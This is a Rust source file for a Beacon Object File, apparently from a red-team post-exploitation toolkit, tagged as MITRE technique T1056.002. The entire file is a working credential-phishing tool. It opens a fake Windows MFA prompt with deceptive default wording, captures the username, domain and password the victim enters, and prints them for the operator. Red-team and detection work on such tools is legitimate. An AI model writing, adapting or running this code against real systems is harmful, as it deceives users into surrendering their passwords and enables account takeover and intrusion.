// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Display a fake MFA credential prompt via CredUIPromptForWindowsCredentials.
//! Args: <caption> <message>
#![no_std]
#![cfg_attr(not(test), no_main)]

use alloc::string::String;
use core::ffi::c_void;
use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1056.002", name: "GUI Input Capture", tactic: "Collection" },
];

const CREDUIWIN_GENERIC: u32 = 0x1;
const CREDUIWIN_CHECKBOX: u32 = 0x2;

// CREDUI_INFOA: cbSize(u32@0), hwndParent(*@8), pszMessageText(*const i8@16), pszCaptionText(*const i8@24), hbmBanner(*@32) — 40 bytes on x64
// Actually CREDUI_INFOA uses ANSI strings
dfr_fn!(
    cred_ui_prompt_for_windows_credentials_a(
        p_ui_info: *const u8,
        dw_auth_error: u32,
        pul_auth_package: *mut u32,
        pv_in_auth_buffer: *const c_void,
        ul_in_auth_buffer_size: u32,
        ppv_out_auth_buffer: *mut *mut c_void,
        pul_out_auth_buffer_size: *mut u32,
        pf_save: *mut i32,
        dw_flags: u32,
    ) -> u32,
    module = "credui.dll",
    api    = "CredUIPromptForWindowsCredentialsA"
);

dfr_fn!(
    cred_unpack_authentication_buffer_a(
        dw_flags: u32,
        p_auth_buffer: *const c_void,
        cb_auth_buffer: u32,
        p_sz_user_name: *mut u8,
        pcch_max_user_name: *mut u32,
        p_sz_domain_name: *mut u8,
        pcch_max_domain_name: *mut u32,
        p_sz_password: *mut u8,
        pcch_max_password: *mut u32,
    ) -> i32,
    module = "credui.dll",
    api    = "CredUnPackAuthenticationBufferA"
);

dfr_fn!(
    co_task_mem_free(pv: *mut c_void) -> (),
    module = "ole32.dll",
    api    = "CoTaskMemFree"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let caption_s = String::from(parser.get_str());
    let message_s = String::from(parser.get_str());

    // Copy user-supplied caption/message into NUL-terminated stack buffers, or
    // fall back to a hardcoded default. The CREDUI_INFOA pszCaptionText /
    // pszMessageText fields must point at NUL-terminated ANSI strings; the
    // stack buffers below outlive the API call because `ui_info`, `cap_buf`,
    // and `msg_buf` share this function's frame.
    let cap_default = b"Security Verification Required";
    let msg_default = b"Your session requires MFA verification. Please enter your credentials.";

    let mut cap_buf = [0u8; 128];
    let mut msg_buf = [0u8; 256];

    let cap_src: &[u8] = if caption_s.is_empty() { cap_default } else { caption_s.as_bytes() };
    let msg_src: &[u8] = if message_s.is_empty() { msg_default } else { message_s.as_bytes() };

    let cap_n = cap_src.len().min(cap_buf.len() - 1);
    cap_buf[..cap_n].copy_from_slice(&cap_src[..cap_n]);
    cap_buf[cap_n] = 0;

    let msg_n = msg_src.len().min(msg_buf.len() - 1);
    msg_buf[..msg_n].copy_from_slice(&msg_src[..msg_n]);
    msg_buf[msg_n] = 0;

    // Build CREDUI_INFOA (40 bytes on x64)
    let mut ui_info = [0u8; 40];
    // cbSize = 40
    unsafe { core::ptr::write_unaligned(ui_info.as_mut_ptr() as *mut u32, 40u32) };
    // hwndParent = NULL at offset 8 — already 0
    // pszMessageText at offset 16
    let msg_ptr = msg_buf.as_ptr() as usize;
    unsafe { core::ptr::write_unaligned(ui_info.as_mut_ptr().add(16) as *mut usize, msg_ptr) };
    // pszCaptionText at offset 24
    let cap_ptr = cap_buf.as_ptr() as usize;
    unsafe { core::ptr::write_unaligned(ui_info.as_mut_ptr().add(24) as *mut usize, cap_ptr) };

    let mut auth_pkg: u32 = 0;
    let mut out_buf: *mut c_void = core::ptr::null_mut();
    let mut out_size: u32 = 0;
    let mut save: i32 = 0;

    let rc = unsafe {
        cred_ui_prompt_for_windows_credentials_a(
            ui_info.as_ptr(),
            0,
            &mut auth_pkg,
            core::ptr::null(),
            0,
            &mut out_buf,
            &mut out_size,
            &mut save,
            CREDUIWIN_GENERIC,
        )
    }.map_err(|_| "prompt failed")?;

    if rc != 0 {
        println!("Prompt cancelled or failed (code {})", rc);
        return Ok(());
    }

    // Unpack credentials
    let mut user = [0u8; 256];
    let mut domain = [0u8; 256];
    let mut pass = [0u8; 256];
    let mut ulen = 256u32;
    let mut dlen = 256u32;
    let mut plen = 256u32;

    let unpack_ok = unsafe {
        cred_unpack_authentication_buffer_a(
            1, // CRED_PACK_GENERIC_CREDENTIALS
            out_buf,
            out_size,
            user.as_mut_ptr(),
            &mut ulen,
            domain.as_mut_ptr(),
            &mut dlen,
            pass.as_mut_ptr(),
            &mut plen,
        )
    }.unwrap_or(0);

    if !out_buf.is_null() {
        unsafe { let _ = co_task_mem_free(out_buf); };
    }

    if unpack_ok != 0 {
        println!("Captured user  : {}", cstr_display(&user, ulen as usize));
        println!("Captured domain: {}", cstr_display(&domain, dlen as usize));
        println!("Captured pass  : {}", cstr_display(&pass, plen as usize));
    } else {
        println!("Credentials captured (unpack failed)");
    }
    Ok(())
}

fn cstr_display(buf: &[u8], max: usize) -> CStr {
    let len = buf[..max.min(buf.len())].iter().position(|&b| b == 0).unwrap_or(max.min(buf.len()));
    CStr(buf, len)
}

struct CStr<'a>(&'a [u8], usize);
impl core::fmt::Display for CStr<'_> {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(core::str::from_utf8(&self.0[..self.1]).unwrap_or("?"))
    }
}
